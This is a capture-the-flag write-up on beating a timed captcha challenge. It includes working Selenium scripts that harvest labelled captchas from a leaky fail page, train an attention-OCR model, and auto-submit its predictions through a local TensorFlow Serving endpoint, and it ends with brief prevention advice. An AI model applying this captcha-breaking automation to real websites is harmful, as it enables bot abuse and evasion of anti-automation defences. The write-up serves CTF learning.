# First thoughts:
On opening the website there is the option to open the captcha site. There I have 30 seconds to input a captcha. If the captcha is right and the time hasn't run out, you get redirectd to the next captcha site where you have to input 3 more.
If the captcha gets input wrong or the time ran out I got redirected to a fail site where the correct captcha was printed out.

# The Exploit:
I knew that there where 4 stages of captchas I had to solve so I thought about automating it. My Idea was to use some kind of atrifical neural network to recognize the characters and input them to the site. To train such a network I needed a lot of trainig data. So data which has the captcha and the solutiun.
Luckily I could just download the captcha from the site and get the captchas label from the fail site. So I wrote a liitle python script which would dump me 10000 captchas save them in a file and note the filename together with the captcha label in a seperate file.
```python
import base64
from selenium import webdriver

driver = webdriver.Chrome()

labels = open("labels.txt", "w")


def get_images(url):
    
    driver.get(url)

    img = driver.find_element_by_tag_name('img')
    img_data = img.get_attribute("src")[22:].encode()

    buttons = driver.find_elements_by_tag_name('button')
    
    for btn in buttons:
        if btn.get_attribute("type") == "submit" and btn.text=="Next":
            btn.click()

            captchaLabel = driver.find_element_by_tag_name('b')

            filename = captchaLabel.text
            with open("captchas/" + filename + ".png", 'wb') as out_file:
                out_file.write(base64.decodebytes(img_data))

            labels.write(filename + '.png ' + filename + '\n')
            break    

if __name__ == '__main__':
    for i in range(0,10000):
        print("Done " + str(i))

        get_images('http://hax1.allesctf.net:9200/captcha/0')

    labels.close()
    driver.close()
```
After I extracted some data I took 10% of the downloaded files and put them in a diffrent file as test data. The rest is training data.
Then I used a tensorflow model from github called [attention ocr](https://github.com/emedvedev/attention-ocr). This model first runs a convolutional neural network on the imgae which splits the image into the characters. Then it uses a long short term momery network to predict the characters. (Note to intstall the attention ocr library you need python2 because the tensorflow 1.14 version is required)
Now I could use the model to create a trainig and testing datasets with the `aocr dataset <captcha-annotations> training.tfrecords` command. With the command `aocr train --max-prediction 16 --max-width 300 training.tfrecords` I could train the network. The 2 parameters `max-prediction` trains the model to have a maximum of 16 characters and the max-width parameter is used to tell the model the maximum width of the provided captchas. (I later found out that 300 was a bit to short but nevertheless it worked for me xD )
I let the model train for a night after that I tested the training data with the command `aocr test --max-prediction 16 --max-width 300 testing.tfrecords` and got a result of almost 100% accuracy for all the testing data. I also had the option to visualize how the model looks at the captcha ![predictionGIF](image.gif).
now that the model was trained I could export it with the `aocr export --max-prediction 16 --max-width 300` command and then start a docker container
```
sudo docker run -p 8501:8501 \                                                                                                                                               
  --mount type=bind,source=<directory>/exported-model/,target=/models/captcha \
  -e MODEL_NAME=captcha -t tensorflow/serving
```
Now I could send a message with curl to receive a prediction:
```
curl -X POST \
  http://localhost:8501/v1/models/captcha:predict \
  -H 'cache-control: no-cache' \
  -H 'content-type: application/json' \
  -d '{
  "signature_name": "serving_default",
  "inputs": {
     	"input": { "b64": "<your image encoded as base64>" }
  }
}'
```

The last step was to use python with selenium to read the captchas and input the right captchas.
```python
import base64
from selenium import webdriver
import requests
import os
import json
import time


driver = webdriver.Chrome()

headers = {
    'cache-control': 'no-cache',
    'content-type': 'application/json',
}

def solve_captcha(img_data):    
    data = '{\n  "signature_name": "serving_default",\n  "inputs": {\n     \t"input": { "b64": "' + img_data.decode("utf-8")  + '" }\n  }\n}'

    response = requests.post('http://localhost:8501/v1/models/captcha:predict', headers=headers, data=data).text

    y = json.loads(response)
    out = y["outputs"]
    print("Prob: " + str(out["probability"]) + " Guess: " + str(out["output"]))

    return out["output"]

def solve_0():
    time.sleep(0.5)
    img = driver.find_element_by_tag_name('img')
    img_data = img.get_attribute("src")[22:].encode()
    
    inp = driver.find_element_by_tag_name('input')
    inp.send_keys(solve_captcha(img_data))

    buttons = driver.find_elements_by_tag_name('button')
    
    for btn in buttons:
        if btn.get_attribute("type") == "submit" and btn.text=="Next":
            btn.click()

            break
    
def solve_1():
    time.sleep(0.5)
    imgs = driver.find_elements_by_tag_name('img')
    inps = driver.find_elements_by_tag_name('input')

    for i in range(0,3):
        img_data = imgs[i].get_attribute("src")[22:].encode()
        inps[i].send_keys(solve_captcha(img_data))

    buttons = driver.find_elements_by_tag_name('button')
    
    for btn in buttons:
        if btn.get_attribute("type") == "submit" and btn.text=="Next":
            btn.click()

            break

def solve_2():
    time.sleep(0.5)
    imgs = driver.find_elements_by_tag_name('img')
    inps = driver.find_elements_by_tag_name('input')


    for i in range(0,10):
        img_data = imgs[i].get_attribute("src")[22:].encode()
    
        inps[i].send_keys(solve_captcha(img_data))

    buttons = driver.find_elements_by_tag_name('button')
    
    for btn in buttons:
        if btn.get_attribute("type") == "submit" and btn.text=="Next":
            btn.click()

            break

def solve_3():
    time.sleep(0.2)
    imgs = driver.find_elements_by_tag_name('img')
    inps = driver.find_elements_by_tag_name('input')


    for i in range(0,100):
        img_data = imgs[i].get_attribute("src")[22:].encode()
    
        inps[i].send_keys(solve_captcha(img_data))

    buttons = driver.find_elements_by_tag_name('button')
    
    for btn in buttons:
        if btn.get_attribute("type") == "submit" and btn.text=="Next":
            btn.click()

            break
    

if __name__ == '__main__':
    driver.get('http://hax1.allesctf.net:9200/captcha/0')

    solve_0()
    solve_1()
    solve_2()
    solve_3()

    #driver.close()
```

# Prevention:
The problem with this site is that the captchas are very easy to crack for an atrifical neural network. Also it is much safer to use a software which is well known to work like reCAPTCHA.
